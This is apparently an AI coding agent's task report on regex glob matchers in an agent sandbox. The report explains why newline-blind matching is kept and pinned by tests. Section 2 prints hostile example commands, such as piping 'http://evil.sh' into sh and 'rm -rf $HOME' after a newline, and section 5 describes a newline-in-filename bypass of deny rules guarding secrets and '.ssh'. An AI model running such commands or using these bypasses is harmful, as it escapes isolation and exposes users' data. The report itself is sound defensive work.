# P2.336, P2.337 — the coupling is now defended, and one of the "five grants" is a deny

**Status:** DONE. **Commit:** `983938128abab65f5fd17f183ee5aee10435a10e`.
**Base SHA recorded before starting:** `09b77d44903d0695afb278515ea9d51260f91e5b`.

**The flag was not added anywhere.** Nine files changed, 349 insertions, and **not one
executable line** — every added line is a comment or a new test. Verified mechanically before
commit: `non-comment-added=0` on all seven modified sources; the single removed line is the
one-line docblock I expanded.

Both rows' premises were confirmed by reproduction. Two of them were also **corrected**, and
one correction changes what P2.337's answer can even be.

---

## 0. Premise check, before anything was changed

| premise | verdict |
| --- | --- |
| `sandbox-settings.ts` `globMatches` cannot cross a newline | **confirmed** — and it is four terminators (LF, CR, U+2028, U+2029), matching P2.329's correction |
| `hook-env-file.ts` joins with `;` to dodge it | **confirmed**, and the tidy-up is measured: swapping the join for a newline kills `*docker*` |
| the reason lives in a third file | **confirmed, and it is worse than "a third file"** — see §1 |
| adding `s` widens an unsandboxing grant | **confirmed, with the concrete case** — see §2 |
| the five in P2.337 are all grant paths | **REFUTED for `mode-manager.ts`** — see §5 |
| the five uniformly fail to cross a newline | **REFUTED for three of them** — see §6 |
| the documentation is silent | **REFUTED — `settings-reference.md` governs `excludedCommands` directly** — see §4 |

**Zone-path correction:** the brief located both P2.336 files under
`packages/shared/src/agent/pi-harness/`. Neither is there. They are
`packages/shared/src/config/sandbox-settings.ts` and
`packages/shared/src/automations/hook-env-file.ts`.

---

## 1. P2.336 — the coupling, and why it is worse than a three-file chain

The dependency spans **three files, no two of which are neighbours**, and the string that
carries it is minted in a fourth place from the one that documents it:

1. `packages/shared/src/config/sandbox-settings.ts` — `globMatches` compiles `*` to `.*`,
   `new RegExp` with **no flags**.
2. `packages/server-core/src/pi-harness/process-supervisor.ts:501`
   `resolveIsolationDowngrade` — matches the user's `sandbox.excludedCommands` globs against
   `[request.command, ...args].join(' ').trim()`.
3. `packages/shared/src/automations/hook-env-file.ts` — `HOOK_ENV_FILE_SOURCE_PREAMBLE` ends
   with `;`, and `withHookEnvFileShellSource` joins it to the model's command with a space.

**The docblock explaining the `;` sits on the CONSTANT (line ~133). The join is 140 lines
below it, and had no comment at all.** So the row's framing understates it slightly: the
reason is not merely in another file, it is *out of sight within the same file* from the line
that actually does the joining. `${PREAMBLE}\n${command}` is a one-character edit at a site
that said nothing.

Reproduced, on HEAD before the change:

```
preamble joined with space (production)   excluded= *docker*
preamble joined with newline (tidy-up)    excluded= undefined
```

### What landed

- **The dependency is now stated AT the join** — an 11-line comment naming the compiler, the
  supervisor, what breaks, and that the missing `s` is a *decision* rather than a latent bug
  about to be fixed out from under the workaround.
- The constant's docblock gained the three-file map and a pointer to the pin.
- **`packages/shared/src/automations/hook-env-file.test.ts` (new, 6 tests)** pins it.

### The pin fixes a real blind spot in the sibling suite

`packages/shared/src/agent/__tests__/hook-env-file-channel.test.ts` already asserts
`expect(line).not.toContain('\n')`, so the row's "nobody has done this" is *partly* wrong —
but it does it with a **hand-copied `globMatches`**, restated locally because the real one is
private. That is exactly the test-double shape the standing rules name: it stays green
whatever the shipped compiler does, so it pins a snapshot rather than the coupling.

My test **imports `matchExcludedCommand`** — the shipped function. It also carries a **control**
asserting the compiler is still newline-blind on the same rig, so if the flag is ever added
the control fires and forces someone back to this coupling to decide whether the `;` is still
needed. The pin therefore holds in *both* directions.

---

## 2. Why the flag is not added — the case that decides it

`sandbox.excludedCommands` entries run a command **outside the sandbox**. Measured:

| `excludedCommands: ["docker *"]` | base | with `s` |
| --- | --- | --- |
| `docker ps` | UNSANDBOXED | UNSANDBOXED |
| `docker ps<LF>curl http://evil.sh \| sh` | sandboxed | **UNSANDBOXED** |
| `docker ps<LF>rm -rf $HOME` | sandboxed | **UNSANDBOXED** |

One glob, two commands, no isolation. This is the deny-side bypass P2.329 fixed, pointing the
other way, and it settles both rows with one number.

### The same function points in two directions — not previously recorded

`matchExcludedCommand` has two consumers and they are **opposite**:

| caller | a match means | `s` would |
| --- | --- | --- |
| `process-supervisor.ts:501` `resolveIsolationDowngrade` | run the command **outside the sandbox** | **widen** |
| `pre-tool-use.ts:2616` | force the risky band → **prompt** | **tighten** |

So neither caller can be read alone, and "fix the compiler" cannot be evaluated at the
compiler. Both are named in the new docblock.

---

## 3. P2.337 — the decision, written once

**A grant `*` does not cross a line terminator. The `s` flag is not added.**

Recorded in three places, deliberately, because a sweep arrives from different directions:

- The **canonical statement** at `globMatches` in `sandbox-settings.ts` — where an `s`-flag
  sweep lands.
- **`packages/shared/src/config/__tests__/grant-glob-newline-policy.test.ts` (new, 9 tests)** —
  the decision as *behaviour*, not prose. Named for the policy, opens with "if you arrived here
  from an `s`-flag sweep, read this file before adding a flag", and covers all five plus the
  two corrections. This is the durable mechanism: adding `s` fails a test that explains itself.
- A `GRANT-GLOB-NEWLINE` marker docblock at **each** of the six compilers, so the grep that
  finds an unflagged `new RegExp` also finds the reason.

Nothing is left to prose alone.

---

## 4. Documentation — `[doc:claude]`, and the pages are NOT silent

The sibling reported the documentation silent on whether `*` crosses a newline. That holds for
`permissions.md` on quoted arguments — but **`excludedCommands` has its own governing sentence
that settles the direction**, and it had not been read.

Anchors taken by `curl`ing the **rendered** pages and grepping `id="…"`; all verified present.

| citation | verbatim sentence |
| --- | --- |
| `settings-reference.md#sandbox-excludedcommands` | "Each entry uses the same syntax as the content of a `Bash(...)` [permission rule](/docs/en/permissions#permission-rule-syntax): an exact command, a prefix such as `docker *`, or a wildcard pattern. When any part of a compound command matches an entry, Claude Code runs the whole command unsandboxed." |
| `permissions.md#bash` | "The recognized command separators are `&&`, `\|\|`, `;`, `\|`, `\|&`, `&`, and newlines. A rule must match each subcommand independently." |
| `permissions.md#wildcard-patterns` | "A `*` in a Bash rule matches any text, including spaces, so one rule covers a family of commands. A rule with no `*` matches one exact command." |
| `sandboxing.md#troubleshooting` | "`docker` commands fail: `docker` is incompatible with the sandbox. Add `docker *` to `excludedCommands` to run it outside the sandbox." |

`excludedCommands` inherits `Bash(...)` rule syntax, and for those a **newline is a documented
separator** with per-subcommand matching required. A `*` crossing it would approve text on both
sides of a separator it never inspected — which that sentence forbids, and which §2 prices.

**Silence, stated explicitly where it is real:** across `sandboxing.md`, `permissions.md`,
`plugin-relevance.md` and `memory.md`, the *only* occurrence of "newline" is the separator
sentence above. Nothing says whether `*` crosses a terminator inside a quoted argument or a
path. There the choice is ours, and it is made in the restrictive direction.

### A separate deviation the same sentence exposes — NOT fixed here

"**When any part of a compound command matches an entry**, Claude Code runs the whole command
unsandboxed" describes **split-then-match-each-subcommand**. Ours is a single anchored regex
over the whole joined line. So `rm -rf $HOME && docker ps` is unsandboxed per the page and
sandboxed by us. **We are tighter than documented**, which is why it is recorded rather than
changed — closing it widens the grant substantially and is an owner decision.
`[doc:claude]` — **forgotten against the documentation.**

---

## 5. Correction: `mode-manager.ts` is NOT a grant compiler

The row and the sibling both classify `agent/mode-manager.ts` `globToRegex` as a grant
compiler feeding `matchesAllowedWritePath`. It has **five** callers, and one of them is a deny:

| caller | direction | input |
| --- | --- | --- |
| `matchesAllowedWritePath` (:2632) | **GRANT** | file paths |
| **`matchesDeniedPath` (:325 → :2338 "Sensitive path blocked")** | **DENY** | file paths |
| `matchesDeniedToolPattern`, `matchesToolPattern`, `matchesToolPermissionRule` | mixed | tool names — inert, cannot carry a terminator |

Measured on the deny side, with real patterns from this repo's own fixtures
(`mode-gate.test.ts:321`, `managed-only-locks.test.ts:339` where `**/.ssh/**` is a *managed
lock*):

```
deniedPaths "/workspace/secrets/**"  plain=DENIED  withLF=ALLOWED  <-- deny does not fire
deniedPaths "**/.ssh/**"             plain=DENIED  withLF=ALLOWED  <-- deny does not fire
allowedWritePaths "/tmp/build/**"    plain=writable withLF=blocked
```

**One `s` there would tighten the deny and widen the grant in the same edit.** So P2.337's
"one decision, five places" cannot be applied to this site as a yes/no — it needs the compiler
**split by direction**, which is a code change with real blast radius and an owner call, not a
flag. Left untouched; stated in a 9-line docblock at `globToRegex`.

A newline-carrying path is constructible and ordinary on POSIX (`/workspace/secrets/a<LF>b` is
a legal filename a model can create and then read), so this is a live gap, not a theoretical
one. **I did not attempt an end-to-end exploit** — the measurement is at the matcher.

`[doc:none]` — **bug**, and **never looked at**.

---

## 6. Correction: the five are not uniformly newline-blind

| compiler | `*` | `**` | `?` | verdict |
| --- | --- | --- | --- | --- |
| `config/sandbox-settings.ts` `globMatches` | `.*` **blind** | — | `.` **blind** | the decision site |
| `agent/mode-manager.ts` `globToRegex` | `[^/]*` **crosses** | `.*` **blind** | `.` **blind** | bidirectional (§5) |
| `plugins/http-hook-env.ts` `pathMatches` | `.*` **blind** | — | — | inert (§7) |
| `agent/local-tools/runtime.ts` `matchesPattern` | `.*` **blind** | — | `.` **blind** | search filter, no permission |
| `marketplace/relevance.ts` `globSegmentSource` | `[^/]*` **crosses** | `.*` **blind** | `[^/]` **crosses** | ranking, no permission |
| `agent/memory/rule-matching.ts` | `[^/]*` **crosses** | `.*` **blind** | `[^/]` **crosses** | rule selector, no permission |

In three of them the **narrower** wildcard (`*`, one segment) already crosses a terminator
because `[^/]` is a negated class, while the **broader** one (`**`) does not. So "leave all
five" preserves an **inconsistency inside each compiler**, not a policy.

I did **not** reconcile it. Tightening the `[^/]` arms is a behaviour change on a live deny
floor and on memory-rule selection, in exchange for no measured benefit. It is recorded in the
policy test as an explicit assertion (`CORRECTION: its '*' arm already crosses one`) so it is
visible rather than hidden. `[doc:none]` — **never looked at**.

---

## 7. `http-hook-env.ts` — inert, proven rather than assumed

The sibling called it unreachable. Confirmed, **with the mechanism and a positive control**:

```
new URL("https://h.example/hooks/a<LF>b").pathname === "/hooks/ab"     <-- the LF is STRIPPED
matchesHttpHookUrlPattern(...raw LF...)  -> true (for a reason unrelated to the flag)
matchesHttpHookUrlPattern(".../a%0Ab")   -> true (stays percent-encoded, ordinary text)
```

No terminator ever reaches the regex. Asserted in the policy test so the absence claim has a
control attached to it permanently. `[doc:none]` — **bug, cosmetic.**

---

## 8. Proof the pins bite — both breaks, against the recorded base

Applied to the working tree, run, reverted from a byte copy taken beforehand.

**BREAK 1 — the tidy-up** (`${PREAMBLE}\n${command}`):

```
(fail) ... > joins the preamble to the model command without a line terminator
(fail) ... > keeps a `*docker*` exclusion matching through the REAL compiler
 13 pass  2 fail   Ran 15 tests across 2 files.
```

**BREAK 2 — the "consistency fix"** (`s` added to `globMatches`):

```
(fail) ... > shows the failure the separator is dodging, so the pin above is not vacuous
(fail) 1. sandbox-settings globMatches — the decision that matters > refuses every terminator,
       so `docker *` cannot unsandbox a second command
 13 pass  2 fail   Ran 15 tests across 2 files.
```

Break 2 is the one worth reading. The policy test catches the flag *and* the hook-env control
fires — so if an owner ever does add `s`, the coupling in §1 is re-raised automatically instead
of being quietly invalidated. That is the "accidental safety made defended" the row asked for,
in both directions.

Every terminator in both suites is a **literal** character, and each file's first assertion is
that the literal differs from the two-character escape — plus a positive control showing the
escape matched all along, which is why a suite written with `'\n'` proves nothing.

---

## 9. Gates — with proof of work

| gate | result |
| --- | --- |
| `bun test` — the two new files (mutex) | **`Ran 15 tests across 2 files.` 15 pass, 0 fail**, 57 expect() calls |
| `bun test` — all 14 affected suites (mutex) | **`Ran 649 tests across 14 files.` 649 pass, 0 fail**, 1026 expect() calls |
| — includes the sibling `hook-env-file-channel.test.ts` | green, unchanged |
| `bun run typecheck:shared` | **1 error, proven foreign** (below) |
| `bunx eslint --format json`, 9 files, **from `packages/shared`** | **`files=9 TOTAL errorCount=0 warningCount=0`** |
| `git diff --check` (my pathspec) | exit 0, **0 bytes** of output |
| `rm -rf release` before the broad run | done |

`typecheck:shared` exits 2 with exactly one error, in
`src/agent/__tests__/fixtures/floating-emission-probe.ts(400,7)` —
`TS2683: 'this' implicitly has type 'any'`. **Not mine, and proven rather than asserted:** with
that one file moved aside `typecheck:shared` **exits 0 with zero error lines**; restored
immediately. The file is another live lane's (`M` in `git status`).
**It was already breaking `typecheck:shared` for everyone when the sibling lane reported it —
it has since been committed and still breaks it, with a different error than the four reported
then.** Worth escalating to whoever owns it.

**NOT-RUN:** nothing. No gate was skipped or cancelled.

### Commit isolation

Five other lanes are live. Before committing I verified every diff line mechanically:

```
runtime.ts +5 -0   rule-matching.ts +5 -0   mode-manager.ts +11 -0
hook-env-file.ts +20 -0   sandbox-settings.ts +36 -1
relevance.ts +4 -0   http-hook-env.ts +6 -0
non-comment-added = 0 on every file
the ONLY removed line anywhere: the one-line `globMatches` docblock I expanded
```

`git show --stat HEAD` contains exactly my 9 files. Working tree clean for my paths afterwards.
The lanes holding `base-agent.ts`, `codex-agent.ts`, `pi-agent.ts`, `nestor-cloud-agent.ts`,
`core/usage-tracker.ts` and `scripts/regenerate-deviation-register.py` were untouched.

---

## 10. Findings to record — kind and tag

1. **`[doc:none]` — bug (the row's own).** `sandbox-settings.ts` `globMatches` is newline-blind
   across four terminators; the workaround at `hook-env-file.ts` was undefended at the join.
   **Fixed by defending the coupling, not the compiler.**
2. **`[doc:claude]` — bug, and a correction to P2.337's premise.** `mode-manager.ts`
   `globToRegex` is **bidirectional**: `matchesDeniedPath` (the `deniedPaths` floor, carrying
   `**/.ssh/**` as a managed lock) is a DENY consumer. `/workspace/secrets/a<LF>b` is not
   denied. **Needs the compiler split by direction — an owner call. Not fixed.**
3. **`[doc:claude]` — forgotten against the documentation.**
   `settings-reference.md#sandbox-excludedcommands`: "When any part of a compound command
   matches an entry, Claude Code runs the whole command unsandboxed." We match one anchored
   regex over the whole joined line instead of per subcommand. **We are tighter than
   documented**; closing it widens the grant. Recorded, not fixed.
4. **`[doc:claude]` — correction to the sibling's documentation verdict.** The pages are *not*
   silent on `excludedCommands`: `settings-reference.md#sandbox-excludedcommands` binds it to
   `Bash(...)` rule syntax, and `permissions.md#bash` makes a newline a separator requiring
   per-subcommand matching. That, not our own instinct, is what settles the direction.
5. **`[doc:none]` — never looked at.** Three compilers are internally inconsistent: `*`
   (`[^/]*`) crosses a terminator while `**` (`.*`) does not. "Leave them" preserves an
   inconsistency, not a policy. Recorded in the policy test; not reconciled.
6. **`[doc:none]` — bug, cosmetic.** `http-hook-env.ts` `pathMatches` lacks `s` **and** `u`;
   inert because `new URL` strips a raw terminator. Now measured with a positive control.
7. **`[doc:none]` — not our surface, recorded as a verdict rather than silence.**
   `local-tools/runtime.ts`, `marketplace/relevance.ts`, `agent/memory/rule-matching.ts` carry
   the omission and decide nothing security-relevant. Marked in place; no behaviour changed.
8. **`[doc:none]` — bug, another lane's.** `src/agent/__tests__/fixtures/floating-emission-probe.ts`
   breaks `typecheck:shared` (`TS2683` at 400,7). Now **tracked and committed**, so it breaks
   the gate for everyone rather than only for whoever has it in their tree.
9. **`[doc:none]` — process, low value.** The brief's zone paths for both P2.336 files were
   wrong (`agent/pi-harness/` for files in `config/` and `automations/`).

---

## 11. Concerns

- **Finding 2 is the one to act on, and it is unresolved by design.** A deny that does not fire
  is the shape P2.329 was opened for, and it is sitting inside a compiler two rows in a row have
  classified as "grant". It cannot be closed by the flag decision these rows made, because the
  same flag widens `matchesAllowedWritePath` in the same edit. It needs its own row.
- **Finding 3 is a genuine documented deviation I deliberately left open.** Ours is tighter than
  the page, so it fails safe, but "we do not implement the documented matching model for
  `excludedCommands`" should not stay only in a report.
- **I did not attempt an end-to-end exploit for finding 2.** The measurement is at the matcher;
  whether a model can get a newline-carrying path through `extractShellPathTokens` and onto a
  real file is unestablished, and I would rather say so than imply a live exploit I did not run.
- **The sibling suite's copied `globMatches` still exists** at
  `agent/__tests__/hook-env-file-channel.test.ts:82`. My new suite makes it redundant rather
  than wrong; that file is another lane's neighbourhood and I did not touch it.
- **Zero executable lines changed.** Everything here is a comment or a test, which is the right
  outcome for two rows whose correct answer was "do not add the flag" — but it means the
  security value is entirely in the pins holding. Both were proven by breaking.
